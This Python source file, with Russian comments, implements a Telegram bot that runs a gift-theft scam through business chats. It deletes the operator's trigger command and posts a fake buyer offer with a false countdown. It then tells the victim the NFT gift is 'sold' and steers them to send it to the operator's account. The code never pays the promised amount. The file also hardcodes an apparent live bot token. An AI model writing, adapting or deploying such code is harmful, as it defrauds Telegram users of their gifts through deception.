import asyncio
import json
import os
import random
import string
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.enums import ParseMode

# --- НАСТРОЙКИ ---
BOT_TOKEN = "9163755409:AAE-uNGYuMXaUR2CUNg4Vu5wVtCz9PMQLcs" # Вставь токен от BotFather
MY_USERNAME = "virtfizu" # Твой юзернейм без @

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

offers_db = {}

def generate_code():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

# --- ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ ВАЛЮТЫ ---
def format_currency(amount, currency):
    if currency.lower() == "ton":
        return f"{amount} TON"
    else:
        return f"{amount} ⭐"

# --- СОЗДАНИЕ ОФФЕРА ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        "Бот запущен.\n\n"
        "Формат: `of \"Ссылка\" \"Сумма\" \"stars/ton\" \"ru\"`\n"
        "Пример: `of \"https://t.me/nft/...\" \"5\" \"ton\" \"ru\"`", 
        parse_mode="Markdown"
    )

@dp.message(F.text.startswith('of "'))
async def create_offer(message: types.Message):
    try:
        text = message.text.replace("of ", "").replace('"', '')
        parts = text.split(" ")
        
        if len(parts) < 4:
            await message.answer("Ошибка формата. Пример: of \"Ссылка\" \"5\" \"ton\" \"ru\"")
            return
        
        lang = parts[-1]
        currency = parts[-2].lower()
        amount = parts[-3]
        nft_name = " ".join(parts[:-3])
        
        if currency not in ["stars", "ton"]:
            await message.answer("Ошибка! Валюта должна быть 'stars' или 'ton'.")
            return

        code = generate_code()
        
        offers_db[code] = {
            "nft_name": nft_name, 
            "amount": amount, 
            "currency": currency,
            "lang": lang
        }
        
        await message.answer(f"Оффер сохранён!\nКод: `/of {code}`", parse_mode="Markdown")
        print(f"Создан: {code} | {amount} {currency}")
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

# --- АКТИВАЦИЯ В БИЗНЕС-ЧАТЕ ---
@dp.business_message(F.text.startswith('/of '))
async def activate_offer(message: types.Message):
    code = message.text.replace("/of ", "").strip()
    if code not in offers_db:
        return
    offer_data = offers_db[code]
    b_conn_id = message.business_connection_id

    try:
        await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id, business_connection_id=b_conn_id)
    except Exception as e:
        print(f"Ошибка удаления: {e}")

    formatted_amount = format_currency(offer_data["amount"], offer_data["currency"])

    if offer_data["lang"] == "ru":
        text = f"<b>Jeffery готов(а) дать {formatted_amount}</b>\n<b>за <u>{offer_data['nft_name']}</u>.</b>\n\n<b>Действует ещё 23h 59m.</b>"
        btn1, btn2 = "Принять", "Отклонить"
    else:
        text = f"<b>Jeffery is ready to give {formatted_amount}</b>\n<b>for <u>{offer_data['nft_name']}</u>.</b>\n\n<b>Valid for another 23h 59m.</b>"
        btn1, btn2 = "Accept", "Decline"

    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text=btn1, callback_data=f"acc_{code}"),
        InlineKeyboardButton(text=btn2, callback_data=f"dec_{code}")
    )

    try:
        await bot.send_message(
            chat_id=message.chat.id,
            text=text,
            reply_markup=builder.as_markup(),
            parse_mode=ParseMode.HTML,
            business_connection_id=b_conn_id,
            link_preview_options={"is_disabled": False}
        )
    except Exception as e:
        print(f"Ошибка: {e}")

# --- КНОПКА ПРИНЯТЬ ---
@dp.callback_query(F.data.startswith("acc_"))
async def process_accept(callback: types.CallbackQuery):
    code = callback.data.split("_")[1]
    b_conn_id = callback.message.business_connection_id
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="ОК", callback_data=f"ok_{code}"))
    
    await bot.edit_message_text(
        chat_id=callback.message.chat.id,
        message_id=callback.message.message_id,
        text="<b>Внимание!</b>\n\nСледуйте инструкциям, чтобы не потерять подарок.",
        reply_markup=builder.as_markup(),
        parse_mode=ParseMode.HTML,
        business_connection_id=b_conn_id
    )
    await callback.answer()

# --- КНОПКА ОК ---
@dp.callback_query(F.data.startswith("ok_"))
async def process_ok(callback: types.CallbackQuery):
    code = callback.data.split("_")[1]
    b_conn_id = callback.message.business_connection_id
    if code in offers_db:
        data = offers_db[code]
        formatted_amount = format_currency(data["amount"], data["currency"])
        
        text = f"🎁 Подарок: {data['nft_name']} продан!\n\nПередайте для зачисления {formatted_amount}."
        
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text="Передать NFT", url=f"tg://send_gift?to={MY_USERNAME}"))
        builder.row(InlineKeyboardButton(text="Как передать NFT?", callback_data=f"how_{code}"))
        
        await bot.edit_message_text(
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id,
            text=text,
            reply_markup=builder.as_markup(),
            business_connection_id=b_conn_id
        )
    await callback.answer()

# --- ИНСТРУКЦИЯ ---
@dp.callback_query(F.data.startswith("how_"))
async def process_how_to(callback: types.CallbackQuery):
    code = callback.data.split("_")[1]
    b_conn_id = callback.message.business_connection_id
    
    # НОВЫЙ ТЕКСТ
    text = "Для передачи нфт нужно нажать кнопку, передать нфт, после лимитированные подарки, и выбрать нфт которое вы продаете."
    
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="Вернуться к офферу", callback_data=f"back_{code}"))
    
    await bot.edit_message_text(
        chat_id=callback.message.chat.id,
        message_id=callback.message.message_id,
        text=text,
        reply_markup=builder.as_markup(),
        business_connection_id=b_conn_id
    )
    await callback.answer()

# --- ВОЗВРАТ К ОФФЕРУ ---
@dp.callback_query(F.data.startswith("back_"))
async def process_back(callback: types.CallbackQuery):
    code = callback.data.split("_")[1]
    b_conn_id = callback.message.business_connection_id
    if code in offers_db:
        data = offers_db[code]
        formatted_amount = format_currency(data["amount"], data["currency"])
        text = f"🎁 Подарок: {data['nft_name']} продан!\n\nПередайте для зачисления {formatted_amount}."
        
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text="Передать NFT", url=f"tg://send_gift?to={MY_USERNAME}"))
        builder.row(InlineKeyboardButton(text="Как передать NFT?", callback_data=f"how_{code}"))
        
        await bot.edit_message_text(
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id,
            text=text,
            reply_markup=builder.as_markup(),
            business_connection_id=b_conn_id
        )
    await callback.answer()

@dp.callback_query(F.data.startswith("dec_"))
async def process_decline(callback: types.CallbackQuery):
    b_conn_id = callback.message.business_connection_id
    await bot.edit_message_text(
        chat_id=callback.message.chat.id,
        message_id=callback.message.message_id,
        text="Оффер отклонен.",
        business_connection_id=b_conn_id
    )
    await callback.answer()

async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
